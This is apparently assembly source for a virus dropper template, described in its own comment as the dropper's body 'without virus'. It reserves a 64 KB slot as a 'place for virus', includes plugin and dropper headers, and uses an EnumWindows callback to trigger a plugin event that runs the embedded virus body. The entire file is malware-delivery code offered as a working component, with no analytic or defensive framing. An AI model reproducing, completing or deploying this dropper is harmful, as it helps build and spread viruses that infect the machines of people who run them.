   ; DROPPER's body (without virus)

   DROPPER_SIZE            equ     65536

   include                 plugin.inc
   include                 dropper.inc

   callW                   macro   _xxx
                           extrn   _xxx:proc
                           call    _xxx
                           endm

                           p386
                           model   flat
                           locals  __
                           jumps

                           .data

   virus                   db      'FUCK'
                           db      DROPPER_SIZE-4096-4 dup (0) ; place for virus

                           .code
   start:
                           push    0
                           push    offset x
                           callW   EnumWindows

                           push    -1
                           callW   ExitProcess

                           org     start+512

   x:                      pusha
                           lea     ebp, virus + size plugin_struc
                           ;;
   _evbase_                equ     0
                           event   'HEPX'
                           ;;
                           popa
                           xor     eax, eax        ; FALSE. no more calls
                           retn

                           end     start
